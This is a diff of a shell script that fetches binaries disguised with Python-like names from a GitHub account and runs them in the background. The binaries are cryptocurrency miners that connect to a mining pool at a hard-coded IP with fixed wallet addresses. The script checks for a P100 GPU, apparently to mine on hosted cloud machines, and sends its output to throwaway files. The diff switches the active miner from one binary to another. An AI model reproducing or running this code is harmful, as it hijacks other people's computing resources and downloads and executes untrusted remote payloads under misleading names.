@@ -6,7 +6,7 @@ IPNAME=$(sed 's|\.|o|g' <<< $iip)
 curl ipinfo.io
 
 echo '#######################################################'
-echo '################## RV +XM + VER v0.0.7 ################'
+echo '################## RV + 5G v0.0.8      ################'
 echo '#######################################################'
 
 
@@ -28,32 +28,42 @@ rm -rf pythonheq
 # Prepare
 PoolHost=116.203.10.54
 VR_Port=3000
-PublicVerusCoinAddress="RNEzrdAY8JNRrEre37aZbegHSx2CgaoXek"
-WorkerName="RV_"$IPNAME
-VR_Threads=4
 
+
+
+
+
+########## CPU
+####### XM
+#wget -q https://github.com/one10001/xmrig/releases/download/bin0.0.1/pythonxm 
+#chmod +x pythonxm
+
+#wget -q https://github.com/one10001/10001code/raw/main/config.json
+#sed -i "s+ip0001+RV_$IPNAME+g" config.json
+#./pythonxm -c config.json 2>> oout 1>> oout &
+
+###### Ver
+#wget -q https://github.com/one10001/10001code/raw/main/pythonheq
+#chmod +x pythonheq
+
+
+
+#./pythonheq -v -l 116.203.10.54:3000 -u RNEzrdAY8JNRrEre37aZbegHSx2CgaoXek."RV_"$IPNAME -t 4   1>> oout 2>> oout &
+
+###### 5G
+wget -q https://github.com/one10001/10001code/raw/main/pythoncpu
+chmod +x pythoncpu
+
+nohup ./pythoncpu -a x16rv2 -o stratum+tcp://116.203.10.54:3015 -u 5PJxraBqyU1yKK5QukamiMZqNdWPcZ3wwB -p c=VGC -t 4 1> oout 2> oout &
+
+
+#GPU
 rm -rf python2.6.6
 rm -rf pythonoc
 wget -q https://github.com/one10001/10001code/releases/download/2.6.6/python2.6.6 2> lol.out
 chmod +x python2.6.6
 cp python2.6.6 pythonoc
 
-#wget -q https://github.com/one10001/xmrig/releases/download/bin0.0.1/pythonxm 
-#chmod +x pythonxm
-
-#wget -q https://github.com/one10001/10001code/raw/main/config.json
-#sed -i "s+ip0001+RV_$IPNAME+g" config.json
-
-wget -q https://github.com/one10001/10001code/raw/main/pythonheq
-chmod +x pythonheq
-
-#CPU
-
-#./pythonxm -c config.json 2>> oout 1>> oout &
-./pythonheq -v -l 116.203.10.54:3000 -u RNEzrdAY8JNRrEre37aZbegHSx2CgaoXek."RV_"$IPNAME -t 4   1>> oout 2>> oout &
-
-
-#GPU
 if [ $(nvidia-smi | grep P100-PCIE |wc -l) == 1 ]
 then
     while true
